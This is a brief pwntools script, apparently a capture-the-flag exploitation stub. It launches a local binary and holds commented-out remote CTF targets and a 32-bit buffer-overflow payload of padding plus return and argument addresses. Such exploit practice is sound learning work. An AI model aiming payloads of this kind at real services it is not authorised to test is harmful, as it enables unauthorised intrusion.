from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

# p=remote("121.37.132.113",10001)
# p=remote("node4.buuoj.cn",25541)

p=process("./test")

# payload=136*b'A'+4*b'B'+p32(0x8048320)+4*b'0'+p32(0x0804A024)
# # payload=b'233'
# p.sendafter(b'What\'s your name? \n',payload)

# p.sendline(payload)
p.interactive()